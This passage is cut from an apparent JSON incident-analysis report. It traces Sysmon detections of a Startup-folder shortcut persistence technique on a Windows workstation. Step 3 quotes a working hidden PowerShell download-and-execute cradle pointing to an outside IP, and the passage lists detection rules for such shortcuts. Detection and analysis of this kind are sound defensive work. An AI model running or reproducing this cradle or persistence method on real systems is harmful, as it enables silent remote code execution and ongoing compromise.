    },
    {
      "step": 2,
      "tactic": "Persistence / Command Execution Arming — LOLBin Shortcut",
      "technique": "T1547.001",
      "what_happened": "At 09:12:09 CET (2 seconds after FIM), Sysmon Event ID 11 (FileCreate) fired on WIN-WS-184: data.win.eventdata.targetFilename=%APPDATA%\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDriveSync_091207.lnk. The creating process image was data.win.eventdata.image=powershell.exe with data.win.eventdata.parentImage=explorer.exe. The .lnk TargetPath embeds Arguments containing -nop -w hidden followed by a http:// reference — indicating a cradle payload that will download and execute a remote script on every logon.",
      "chain_reason": "Sysmon EID 11 rule 61611 'Sysmon EID 11 FileCreate: Startup folder .lnk' [T1547.001] on data.win.eventdata.targetFilename containing *Startup*.lnk, image=powershell.exe. A second rule 92303 '.lnk Arguments contain http:// or -EncodedCommand' fired on the embedded shortcut arguments.",
      "first_seen": "2027-03-14T09:12:09+0100"
    },
    {
      "step": 3,
      "tactic": "Persistence / Payload Staging — Outbound C2 Reference Embedded",
      "technique": "T1547.001",
      "what_happened": "The .lnk Arguments field captured in the Sysmon EID 11 event contains: -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.47/sync.ps1')\". On every user logon, powershell.exe will silently download and execute sync.ps1 from the remote C2 IP 185.220.101.47. The -nop (NoProfile) and -w hidden (WindowStyle Hidden) flags are classic defence-evasion arguments ensuring the PowerShell window is invisible to the user.",
